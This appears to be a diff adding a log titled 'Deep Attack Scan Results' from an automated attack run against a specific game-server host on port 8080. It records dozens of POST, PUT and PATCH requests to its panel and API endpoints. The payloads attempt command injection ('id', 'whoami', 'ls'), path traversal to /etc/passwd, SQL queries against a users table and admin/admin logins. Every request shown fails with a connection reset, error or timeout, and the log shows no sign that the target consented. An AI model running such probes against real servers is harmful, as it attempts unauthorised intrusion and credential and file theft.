@@ -1,0 +1,36 @@
+=== Deep Attack Scan Results ===
+
+[*] Starting deep attack on http://mc.clovergame.org:8080
+[*] Testing 13 endpoints, 5 methods, 14 param sets, 8 body types, 6 header sets
+[*] Timeout set to 3 seconds
+
+[POST] http://mc.clovergame.org:8080/panel params={'command': 'ls'} body={'file': '/etc/passwd'} -> ERROR: ("Connection broken: ConnectionResetError(104, 'Connection reset by peer')", ConnectionResetError(10
+[POST] http://mc.clovergame.org:8080/panel params={'path': '../../../../etc/passwd'} body={'action': 'login', 'user': 'admin', 'pass': 'admin'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[POST] http://mc.clovergame.org:8080/panel params={'url': 'http://example.com'} body={'action': 'login', 'user': 'admin', 'pass': 'admin'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[POST] http://mc.clovergame.org:8080/panel params={'query': 'SELECT * FROM users'} body={'data': 'test'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[POST] http://mc.clovergame.org:8080/panel params={'exec': 'id'} body={'command': 'ls'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[POST] http://mc.clovergame.org:8080/panel params={'exec': 'id'} body={'exec': 'id'} -> ERROR: ("Connection broken: ConnectionResetError(104, 'Connection reset by peer')", ConnectionResetError(10
+[PUT] http://mc.clovergame.org:8080/panel params={'data': 'test'} body={'cmd': 'whoami'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[PUT] http://mc.clovergame.org:8080/panel params={'path': '../../../../etc/passwd'} body={'action': 'login', 'user': 'admin', 'pass': 'admin'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[PUT] http://mc.clovergame.org:8080/panel params={'url': 'http://example.com'} body={'action': 'login', 'user': 'admin', 'pass': 'admin'} -> TIMEOUT
+[PUT] http://mc.clovergame.org:8080/panel params={'id': '1'} body={'query': 'SELECT 1'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[PUT] http://mc.clovergame.org:8080/panel params={'command': 'ls'} body={'name': 'test', 'content': 'hello'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[PATCH] http://mc.clovergame.org:8080/panel params={'cmd': 'whoami'} body={'cmd': 'whoami'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[PATCH] http://mc.clovergame.org:8080/panel params={'file': '/etc/passwd'} body={'data': 'test'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[PATCH] http://mc.clovergame.org:8080/panel params={'page': '1'} body={'name': 'test', 'content': 'hello'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[PATCH] http://mc.clovergame.org:8080/panel params={'page': '1'} body={'exec': 'id'} -> ERROR: ("Connection broken: ConnectionResetError(104, 'Connection reset by peer')", ConnectionResetError(10
+[POST] http://mc.clovergame.org:8080/api/files params={'exec': 'id'} body={'file': '/etc/passwd'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[POST] http://mc.clovergame.org:8080/api/files params={'username': 'admin', 'password': 'admin'} body={'action': 'login', 'user': 'admin', 'pass': 'admin'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[POST] http://mc.clovergame.org:8080/api/files params={'path': '../../../../etc/passwd'} body={'data': 'test'} -> ERROR: ("Connection broken: ConnectionResetError(104, 'Connection reset by peer')", ConnectionResetError(10
+[POST] http://mc.clovergame.org:8080/api/files params={'path': '../../../../etc/passwd'} body={'exec': 'id'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[PUT] http://mc.clovergame.org:8080/api/files params={'query': 'SELECT * FROM users'} body={'action': 'login', 'user': 'admin', 'pass': 'admin'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[PUT] http://mc.clovergame.org:8080/api/files params={'command': 'ls'} body={'action': 'login', 'user': 'admin', 'pass': 'admin'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[PUT] http://mc.clovergame.org:8080/api/files params={'query': 'SELECT * FROM users'} body={'data': 'test'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[PUT] http://mc.clovergame.org:8080/api/files params={'command': 'ls'} body={'query': 'SELECT 1'} -> ERROR: ("Connection broken: ConnectionResetError(104, 'Connection reset by peer')", ConnectionResetError(10
+[PATCH] http://mc.clovergame.org:8080/api/files body={'action': 'login', 'user': 'admin', 'pass': 'admin'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[PATCH] http://mc.clovergame.org:8080/api/files params={'exec': 'id'} body={'data': 'test'} -> ERROR: ("Connection broken: ConnectionResetError(104, 'Connection reset by peer')", ConnectionResetError(10
+[PATCH] http://mc.clovergame.org:8080/api/files params={'data': 'test'} body={'name': 'test', 'content': 'hello'} -> ERROR: ("Connection broken: ConnectionResetError(104, 'Connection reset by peer')", ConnectionResetError(10
+[PATCH] http://mc.clovergame.org:8080/api/files params={'command': 'ls'} body={'command': 'ls'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[POST] http://mc.clovergame.org:8080/api/version params={'cmd': 'whoami'} body={'cmd': 'whoami'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[POST] http://mc.clovergame.org:8080/api/version params={'file': '/etc/passwd'} body={'action': 'login', 'user': 'admin', 'pass': 'admin'} -> ERROR: ("Connection broken: ConnectionResetError(104, 'Connection reset by peer')", ConnectionResetError(10
+[POST] http://mc.clovergame.org:8080/api/version params={'data': 'test'} body={'action': 'login', 'user': 'admin', 'pass': 'admin'} -> CONNECTION_ERROR: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
